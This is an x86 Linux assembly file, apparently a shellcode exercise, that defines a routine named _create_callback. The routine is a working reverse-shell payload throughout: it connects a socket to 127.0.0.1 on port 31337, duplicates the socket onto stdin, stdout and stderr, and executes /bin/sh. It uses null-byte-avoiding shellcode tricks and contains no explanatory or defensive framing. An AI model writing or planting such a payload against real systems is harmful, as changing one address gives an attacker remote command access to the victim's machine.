.global _create_callback
.section .text

_create_callback:
pushl	%ebp
movl	%esp, %ebp

subl	$20, %esp				# local var "socketfd", struct "addr"
xor		%eax, %eax
mov		%eax, 8(%esp)			# addr.sin_zero (8B) unused
add		$2, %eax
movw	%ax, (%esp)				# addr.sin_family = AF_INET
movw	$0x697A, 2(%esp)		# addr.sin_port = 31337 (big-endian)
shl		$23, %eax
add		$0x7F, %eax
movl	%eax, 4(%esp)			# addr.sin_addr.s_addr = 127.0.0.1 (0x0100007F in big-endian)

xor		%eax, %eax
pushl	%eax			# parameters for socket(AF_INET, SOCK_STREAM, 0)
inc		%eax
pushl	%eax
movl	%eax, %ebx
inc		%eax
pushl	%eax
push	$0x66
pop		%eax			# syscall to socketcall(SYS_SOCKET, *parameters)
movl	%esp, %ecx
int		$0x80
addl	$12, %esp
movl	%eax, 16(%esp)	# socketfd = socket(...)

movl	%esp, %ecx
push	$16				# parameters for connect(sockfd, &addr, sizeof(addr))
pop		%eax
pushl	%eax
pushl	%ecx
pushl	16(%ecx)
push	$0x66
pop		%eax			# syscall to socketcall(SYS_CONNECT, *parameters)
xor		%ebx, %ebx
add		$3, %ebx
mov		%esp, %ecx
int		$0x80
addl	$12, %esp

push	$0x3f
mov		(%esp), %eax	# syscall to dup2(socketfd, stdin)
mov		20(%esp), %ebx
xor		%ecx, %ecx
int		$0x80
mov		(%esp), %eax	# syscall to dup2(socketfd, stdout)
inc		%ecx
int		$0x80
pop		%eax			# syscall to dup2(socketfd, stderr)
inc		%ecx
int		$0x80

push	$0xb
pop 	%eax			# syscall to execve('/bin/sh', *argv['/bin/sh'], NULL)
cltd					# edx <- sext(eax)
pushl	%edx
pushl	$0x68732f2f		# “//sh”
pushl	$0x6e69622f		# “/bin”
movl	%esp, %ebx
pushl	%edx
pushl	%ebx
movl	%esp, %ecx
int		$0x80
